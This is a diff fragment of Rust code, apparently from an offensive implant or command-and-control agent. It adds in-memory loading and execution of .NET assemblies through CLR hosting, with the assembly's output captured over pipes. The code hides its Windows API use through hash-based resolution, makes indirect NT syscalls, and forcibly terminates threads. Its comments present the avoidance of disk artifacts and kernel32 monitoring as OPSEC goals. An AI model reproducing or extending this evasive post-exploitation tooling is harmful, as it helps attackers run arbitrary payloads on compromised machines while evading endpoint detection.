+    let mut stdout_write: HANDLE = std::ptr::null_mut();
+    let mut stderr_read: HANDLE = std::ptr::null_mut();
+    let mut stderr_write: HANDLE = std::ptr::null_mut();
+
+    if create_pipe(&mut stdout_read, &mut stdout_write, &mut sa, 0) == 0 {
+        return Err("CreatePipe(stdout) failed".to_string());
+    }
+    if create_pipe(&mut stderr_read, &mut stderr_write, &mut sa, 0) == 0 {
+        let close: FnCloseHandle = resolve_api(
+            pe_resolve::HASH_KERNEL32_DLL,
+            pe_resolve::hash_str(b"CloseHandle\0"),
+        ).unwrap_or(std::mem::transmute(std::ptr::null::<()>()));
+        if !close as bool { close(stdout_read); }
+        if !close as bool { close(stdout_write); }
+        return Err("CreatePipe(stderr) failed".to_string());
+    }
+
+    // ── 8. Spawn execution on a separate thread with timeout ────────────
+    //
+    // We call Invoke_2 on a separate thread so we can enforce the timeout.
+    // The CLR thread will write to our redirected stdout/stderr pipes.
+
+    let invoke_name = to_wide("Invoke_2");
+    let dispid_invoke = dispatch_get_id(method_disp, &invoke_name)?;
+
+    // Prepare invoke args: Invoke_2(object obj, object[] parameters)
+    // obj = null (VT_NULL), parameters = SAFEARRAY(object) or VT_NULL if no args
+    let null_variant = VARIANT::null();
+    let args_variant = if sa_args.is_null() {
+        VARIANT::null()
+    } else {
+        VARIANT::from_safe_array_variant(sa_args)
+    };
+
+    let mut invoke_args = [null_variant, args_variant];
+
+    // We need to run this on a separate thread for timeout enforcement.
+    // Clone the raw pointers into a Send-able wrapper for the thread.
+    struct InvokeCtx {
+        method_disp: *mut IDispatch,
+        dispid_invoke: i32,
+        stdout_write: HANDLE,
+        stderr_write: HANDLE,
+        invoke_args: [VARIANT; 2],
+    }
+    unsafe impl Send for InvokeCtx {}
+
+    let ctx = InvokeCtx {
+        method_disp,
+        dispid_invoke,
+        stdout_write,
+        stderr_write,
+        invoke_args: invoke_args.clone(),
+    };
+
+    // Save original stdout/stderr so we can restore after.
+    let get_std_handle: unsafe extern "system" fn(u32) -> HANDLE = std::mem::transmute(
+        pe_resolve::get_proc_address_by_hash(
+            pe_resolve::HASH_KERNEL32_DLL as usize,
+            pe_resolve::hash_str(b"GetStdHandle\0"),
+        ).ok_or("cannot resolve GetStdHandle")?
+    );
+    let set_std_handle: unsafe extern "system" fn(u32, HANDLE) -> i32 = std::mem::transmute(
+        pe_resolve::get_proc_address_by_hash(
+            pe_resolve::HASH_KERNEL32_DLL as usize,
+            pe_resolve::hash_str(b"SetStdHandle\0"),
+        ).ok_or("cannot resolve SetStdHandle")?
+    );
+    const STD_OUTPUT_HANDLE: u32 = 0xFFFFFFF5u32 as u32;
+    const STD_ERROR_HANDLE: u32 = 0xFFFFFFF4u32 as u32;
+
+    let orig_stdout = get_std_handle(STD_OUTPUT_HANDLE);
+    let orig_stderr = get_std_handle(STD_ERROR_HANDLE);
+
+    let thread_result = std::thread::spawn(move || -> Result<VARIANT, String> {
+        // Redirect stdout/stderr to our pipes (on this thread).
+        set_std_handle(STD_OUTPUT_HANDLE, ctx.stdout_write);
+        set_std_handle(STD_ERROR_HANDLE, ctx.stderr_write);
+
+        let method = &*ctx.method_disp;
+        let mut result = VARIANT::empty();
+        let mut excep = std::mem::zeroed::<EXCEPINFO>();
+        let mut arg_err: u32 = 0;
+
+        let mut params = DISPPARAMS {
+            rgvarg: ctx.invoke_args.as_mut_ptr(),
+            rgdispid_named_args: std::ptr::null_mut(),
+            c_args: 2,
+            c_named_args: 0,
+        };
+
+        let hr = (method.vtable.invoke)(
+            ctx.method_disp as *mut c_void,
+            ctx.dispid_invoke,
+            IID_NULL.as_ptr(),
+            LOCALE_USER_DEFAULT,
+            DISPATCH_METHOD,
+            &mut params,
+            &mut result,
+            &mut excep,
+            &mut arg_err,
+        );
+
+        // Restore original handles before returning.
+        set_std_handle(STD_OUTPUT_HANDLE, orig_stdout);
+        set_std_handle(STD_ERROR_HANDLE, orig_stderr);
+
+        if hr != S_OK {
+            let mut desc = format!("hr={:#010X}", hr as u32);
+            if !excep.bstr_description.is_null() {
+                let mut chars = Vec::new();
+                let mut p = excep.bstr_description;
+                for _ in 0..256 {
+                    if *p == 0 { break; }
+                    chars.push(*p);
+                    p = p.add(1);
+                }
+                if let Some(sys_free) = resolve_oleaut32_fn::<FnSysFreeString>(b"SysFreeString\0") {
+                    sys_free(excep.bstr_description);
+                }
+                desc = format!("{} — {}", String::from_utf16_lossy(&chars), desc);
+            }
+            Err(format!("MethodInfo.Invoke_2 failed: {}", desc))
+        } else {
+            Ok(result)
+        }
+    });
+
+    // ── 9. Wait for thread with timeout ─────────────────────────────────
+    let close_handle: FnCloseHandle = resolve_api(
+        pe_resolve::HASH_KERNEL32_DLL,
+        pe_resolve::hash_str(b"CloseHandle\0"),
+    ).ok_or("cannot resolve CloseHandle")?;
+
+    let timeout_ms = timeout_secs * 1000;
+    let mut needs_reinit = false;
+    let mut invoke_result: Option<VARIANT> = None;
+
+    // Use NtWaitForSingleObject on the thread handle to enforce timeout.
+    let exec_raw_handle = thread_result.as_raw_handle();
+    let timeout_100ns: i64 = -((timeout_secs as i64) * 10_000_000i64);
+    let wait_status = syscall!(
+        "NtWaitForSingleObject",
+        exec_raw_handle as u64,
+        0u64, // Alertable = FALSE
+        &timeout_100ns as *const _ as u64,
+    );
+
+    let wait_ok = match wait_status {
+        Ok(s) if s >= 0 => true,
+        _ => false,
+    };
+
+    // Check if the thread completed (STATUS_WAIT_0 = 0)
+    let thread_completed = wait_ok && wait_status.unwrap() == 0;
+
+    if thread_completed {
+        match thread_result.join() {
+            Ok(Ok(result)) => {
+                invoke_result = Some(result);
+            }
+            Ok(Err(e)) => {
+                log::warn!("[assembly_loader] in-memory invoke failed: {}", e);
+            }
+            Err(_) => {
+                log::warn!("[assembly_loader] in-memory execution thread panicked");
+                needs_reinit = true;
+            }
+        }
+    } else {
+        // Timeout — forcefully terminate the thread.
+        log::warn!(
+            "[assembly_loader] in-memory assembly timed out after {}s — terminating CLR thread",
+            timeout_secs
+        );
+        let term_status = syscall!("NtTerminateThread", exec_raw_handle as u64, 0u64);
+        match term_status {
+            Ok(s) if s >= 0 => {
+                log::info!("[assembly_loader] CLR exec thread terminated (status 0x{s:08X})");
+            }
+            Ok(s) => {
+                log::warn!(
+                    "[assembly_loader] NtTerminateThread returned failure 0x{s:08X}"
+                );
+            }
+            Err(e) => {
+                log::warn!(
+                    "[assembly_loader] NtTerminateThread syscall failed: {e}"
+                );
+            }
+        }
+        // Drop the JoinHandle without joining — the thread is already dead.
+        // NtClose the OS handle since we've already terminated the thread.
+        let _ = syscall!("NtClose", exec_raw_handle as u64);
+        std::mem::forget(thread_result);
+        needs_reinit = true;
+    }
+
+    // Close write ends so read_pipe_to_vec can finish.
+    close_handle(stdout_write);
+    close_handle(stderr_write);
+
+    // Read captured output.
+    let mut output_buf = Vec::new();
+    read_pipe_to_vec(stdout_read, &mut output_buf);
+    read_pipe_to_vec(stderr_read, &mut output_buf);
+    close_handle(stdout_read);
+    close_handle(stderr_read);
+
+    let output = String::from_utf8_lossy(&output_buf).to_string();
+
+    // ── 10. Cleanup ─────────────────────────────────────────────────────
+    if let Some(mut result) = invoke_result {
+        variant_clear(&mut result);
+    }
+
+    // Free arg BSTRs.
+    for bstr in &arg_bstrs {
+        sys_free_string(*bstr);
+    }
+    if !sa_args.is_null() {
+        safe_array_destroy(sa_args);
+    }
+
+    // Release MethodInfo, Assembly IDispatch.
+    if !method_info.is_null() {
+        let md = &*(method_info as *const IDispatch);
+        (md.vtable.release)(method_info);
+    }
+    variant_clear(&mut ep_result);
+    variant_clear(&mut assembly_result);
+
+    // Release AppDomain IDispatch + IUnknown.
+    let disp = &*appdomain;
+    (disp.vtable.release)(appdomain as *mut c_void);
+    let unk = &*(appdomain_ptr as *const ICLRRuntimeHost);
+    (unk.vtable.release)(appdomain_ptr);
+
+    log::info!("[assembly_loader] in-memory: execution complete, {} bytes output", output.len());
+
+    if needs_reinit {
+        // Flag CLR for reinit on next call.
+        let mut guard = CLR_HOST.lock().map_err(|e| format!("lock: {e}"))?;
+        if let Some(ref mut state) = *guard {
+            state.needs_reinit = true;
+        }
+    }
+
+    Ok(AssemblyResult {
+        output,
+        hresult: S_OK,
+    })
+}
+
 /// Execute a .NET assembly in-process using the CLR hosting APIs.
 ///
 /// # Arguments
@@ -1041,14 +2056,14 @@ pub unsafe fn execute(
     ensure_idle_watcher();
 
     // ── Ensure CLR host is initialized ──────────────────────────────────
-    let runtime_host = {
+    let (runtime_host, cor_host) = {
         let mut guard = CLR_HOST.lock().map_err(|e| format!("CLR_HOST lock poisoned: {e}"))?;
         match *guard {
             Some(ref mut state)
                 if state.initialized && !state.runtime_host.is_null() && !state.needs_reinit =>
             {
                 state.last_used = Instant::now();
-                state.runtime_host
+                (state.runtime_host, state.cor_host)
             }
             Some(ref mut state) if state.initialized && state.needs_reinit => {
                 // CLR was left in a potentially inconsistent state after a
@@ -1061,35 +2076,74 @@ pub unsafe fn execute(
                 }
                 state.initialized = false;
                 state.needs_reinit = false;
-                let host = init_clr_host()?;
+                let (rh, ch) = init_clr_host()?;
                 *state = ClrHostState {
                     mscoree: std::ptr::null_mut(),
-                    runtime_host: host,
+                    runtime_host: rh,
+                    cor_host: ch,
                     create_instance_fn: None,
                     last_used: Instant::now(),
                     initialized: true,
                     needs_reinit: false,
                 };
-                host
+                (rh, ch)
             }
             _ => {
-                let host = init_clr_host()?;
+                let (rh, ch) = init_clr_host()?;
                 *guard = Some(ClrHostState {
                     mscoree: std::ptr::null_mut(), // tracked but not needed after init
-                    runtime_host: host,
+                    runtime_host: rh,
+                    cor_host: ch,
                     create_instance_fn: None,
                     last_used: Instant::now(),
                     initialized: true,
                     needs_reinit: false,
                 });
-                host
+                (rh, ch)
             }
         }
     };
 
-    // ── Write assembly to NT-native temp file (no disk write via kernel32) ──
+    // ── Try in-memory loading first ─────────────────────────────────────
+    //
+    // If ICorRuntimeHost was obtained, attempt to load the assembly from
+    // memory via IDispatch late binding (AppDomain.Load_3 + EntryPoint.Invoke).
+    // This avoids the temp file write entirely — no disk artifact at all.
+    //
+    // If in-memory loading fails or is unavailable, fall through to the
+    // existing file-based ExecuteInDefaultAppDomain path.
+    if !cor_host.is_null() {
+        log::info!(
+            "[assembly_loader] attempting in-memory assembly loading (no disk write)"
+        );
+        match execute_in_memory_internal(
+            cor_host,
+            assembly_bytes,
+            args,
+            timeout_secs.unwrap_or(DEFAULT_TIMEOUT_SECS),
+        ) {
+            Ok(result) => {
+                log::info!("[assembly_loader] in-memory execution succeeded");
+                return Ok(result);
+            }
+            Err(e) => {
+                log::warn!(
+                    "[assembly_loader] in-memory loading failed ({}), falling back to file-based path",
+                    e
+                );
+                // Fall through to file-based path below.
+            }
+        }
+    } else {
+        log::info!(
+            "[assembly_loader] ICorRuntimeHost not available, using file-based path"
+        );
+    }
+
+    // ── Write assembly to NT-native temp file (fallback path) ────────
     // ExecuteInDefaultAppDomain requires a file path, so we must have a real
-    // file.  However, we avoid kernel32 file I/O entirely by using NtCreateFile
+    // file.  This is the fallback when in-memory loading is unavailable.
+    // We avoid kernel32 file I/O entirely by using NtCreateFile
     // + NtWriteFile via indirect syscalls.  Key OPSEC improvements:
     //
     // 1. FILE_ATTRIBUTE_TEMPORARY — cache manager hint to keep in memory, avoid
